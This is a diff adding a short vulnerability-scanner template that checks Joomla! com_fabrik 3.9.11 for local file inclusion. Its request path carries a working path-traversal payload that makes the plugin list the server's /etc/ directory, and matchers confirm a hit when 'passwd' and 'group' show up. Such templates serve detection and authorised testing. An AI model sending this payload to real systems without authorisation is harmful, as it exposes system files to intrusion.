@@ -1,0 +1,24 @@
+id: joomla-com-fabrik-lfi
+name: Joomla! com_fabrik 3.9.11 - Local File Inclusion
+severity: high
+confidence: tentative
+description: Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- joomla
+- lfi
+- edb
+- vuln
+requests:
+- method: GET
+  path: /index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/
+  matchers:
+  - type: body
+    words:
+    - '"value":"passwd"'
+    - '"value":"group"'
+    - '"disable":false'
+  - type: status
+    status:
+    - 200
+  condition: and
